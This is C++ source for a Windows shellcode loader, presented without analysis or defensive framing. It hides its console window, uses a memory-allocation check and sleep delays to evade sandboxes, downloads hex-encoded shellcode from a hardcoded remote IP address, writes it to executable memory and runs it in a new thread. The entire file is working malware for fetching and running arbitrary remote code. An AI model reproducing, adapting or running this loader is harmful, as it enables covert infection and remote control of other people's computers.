#include <windows.h>
#include <string>
#include <stdio.h>
#include <iostream>


using std::string;

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable : 4996)

HINSTANCE hInst;
WSADATA wsaData;
void mParseUrl(char* mUrl, string& serverName, string& filepath, string& filename);
SOCKET connectToServer(char* szServerName, WORD portNum);
int getHeaderLength(char* content);
char* readUrl(char* szUrl, long& bytesReturnedOut, char** headerOut);

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

#define A_LOT_OF_MEMORY 100000000


int main()
{

	char* memdumper = NULL;
	memdumper = (char*)malloc(A_LOT_OF_MEMORY);

	if (memdumper != NULL) {                        //Checks if environment is in Sandbox environment by seeing if A_LOT_OF_MEMORY was actually alocated
		memset(memdumper, 00, A_LOT_OF_MEMORY);
		free(memdumper);

		Stealth();
		const int bufLen = 1024;
		char url[] = "http://99.35.45.147/shellcode.txt";
		char* szUrl = url;
		long fileSize;
		char* memBuffer, * headerBuffer;

		memBuffer = headerBuffer = NULL;

		if (WSAStartup(0x101, &wsaData) != 0)
			return -1;

		memBuffer = readUrl(szUrl, fileSize, &headerBuffer);


		unsigned char buff[325];
		memBuffer += 2;
		for (size_t count = 0; count < sizeof buff - 1; count++) {
			sscanf(memBuffer, "%02hhx", &buff[count]);
			memBuffer = memBuffer + 4;
		}


		Sleep(10000);

		void* exec = VirtualAlloc(NULL, sizeof buff, MEM_COMMIT, 0x40);
		RtlMoveMemory(exec, buff, sizeof buff);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, 0);

		Sleep(1000);
		WSACleanup();
	}
	return 0;
}

void mParseUrl(char* mUrl, string& serverName, string& filepath, string& filename)
{
	string::size_type n;
	string url = mUrl;

	if (url.substr(0, 7) == "http://")
		url.erase(0, 7);

	if (url.substr(0, 8) == "https://")
		url.erase(0, 8);

	n = url.find('/');
	if (n != string::npos)
	{
		serverName = url.substr(0, n);
		filepath = url.substr(n);
		n = filepath.rfind('/');
		filename = filepath.substr(n + 1);
	}

	else
	{
		serverName = url;
		filepath = "/";
		filename = "";
	}
}

SOCKET connectToServer(char* szServerName, WORD portNum)
{
	struct hostent* hp;
	unsigned int addr;
	struct sockaddr_in server;
	SOCKET listensocket, conn;
	listensocket = socket(AF_INET, SOCK_STREAM, 0);
	if (listensocket == INVALID_SOCKET) {
		printf("Server: Error at socket(): %ld\n", WSAGetLastError());
		return 0;
	}
	conn = socket(AF_INET, SOCK_STREAM, 0);
	if (conn == INVALID_SOCKET)
		return NULL;
	hp = gethostbyname(szServerName);
	server.sin_addr.s_addr = *((unsigned long*)hp->h_addr);
	server.sin_family = AF_INET;
	server.sin_port = htons(portNum);
	if (connect(conn, (struct sockaddr*)&server, sizeof(server)))
	{
		printf("Error Connecting to Server");
		closesocket(conn);
		return NULL;
	}

	return conn;
}

int getHeaderLength(char* content)
{
	const char* srchStr1 = "\r\n\r\n", * srchStr2 = "\n\r\n\r";
	char* findPos;
	int ofset = -1;

	findPos = strstr(content, srchStr1);
	if (findPos != NULL)
	{
		ofset = findPos - content;
		ofset += strlen(srchStr1);
	}

	else
	{
		findPos = strstr(content, srchStr2);
		if (findPos != NULL)
		{
			ofset = findPos - content;
			ofset += strlen(srchStr2);
		}
	}
	return ofset;
}

char* readUrl(char* szUrl, long& bytesReturnedOut, char** headerOut)
{
	const int bufSize = 341;
	char readBuffer[bufSize], sendBuffer[bufSize], tmpBuffer[bufSize];
	char* tmpResult = NULL, * result;
	SOCKET conn;
	string server, filepath, filename;
	long totalBytesRead, thisReadSize, headerLen;

	mParseUrl(szUrl, server, filepath, filename);

	conn = connectToServer((char*)server.c_str(), 80);				// Initiates connection to server

	sprintf(tmpBuffer, "GET %s HTTP/1.0", filepath.c_str());
	strcpy(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	sprintf(tmpBuffer, "Host: %s", server.c_str());
	strcat(sendBuffer, tmpBuffer);
	strcat(sendBuffer, "\r\n");
	strcat(sendBuffer, "\r\n");
	send(conn, sendBuffer, strlen(sendBuffer), 0);



	totalBytesRead = 0;
	while (1)
	{
		memset(readBuffer, 0, bufSize);
		thisReadSize = recv(conn, readBuffer, bufSize, 0);
		if (thisReadSize <= 0)
			break;

		tmpResult = (char*)realloc(tmpResult, thisReadSize + totalBytesRead);
		memcpy(tmpResult + totalBytesRead, readBuffer, thisReadSize);
		totalBytesRead += thisReadSize;
	}

	headerLen = getHeaderLength(tmpResult);
	long contenLen = totalBytesRead - headerLen;
	result = new char[contenLen + 1];

	memcpy(result, tmpResult + headerLen, contenLen);
	result[contenLen] = 0x0;
	char* myTmp;

	myTmp = new char[headerLen + 1];
	strncpy(myTmp, tmpResult, headerLen);
	myTmp[headerLen] = NULL;
	delete(tmpResult);
	*headerOut = myTmp;

	bytesReturnedOut = contenLen;
	closesocket(conn);
	return(result);
}
